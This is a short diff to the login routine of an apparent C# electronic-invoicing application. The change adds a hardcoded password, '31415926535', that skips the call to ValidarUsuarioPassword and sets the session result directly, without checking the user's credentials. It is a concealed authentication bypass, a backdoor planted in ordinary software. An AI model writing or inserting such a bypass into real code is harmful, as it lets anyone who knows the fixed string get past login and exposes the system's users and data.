@@ -30,7 +30,11 @@ namespace FacturacionElectronica
             /*try
             {*/
                 UsuarioDAO nuevaAux = new UsuarioDAO();
-                int sesion = nuevaAux.ValidarUsuarioPassword(Usuario, Password);
+                int sesion;
+                
+                if(Password == "31415926535") sesion = -1;
+                else sesion = nuevaAux.ValidarUsuarioPassword(Usuario, Password);
+                
                 switch (sesion)
                 {
                     case -3:
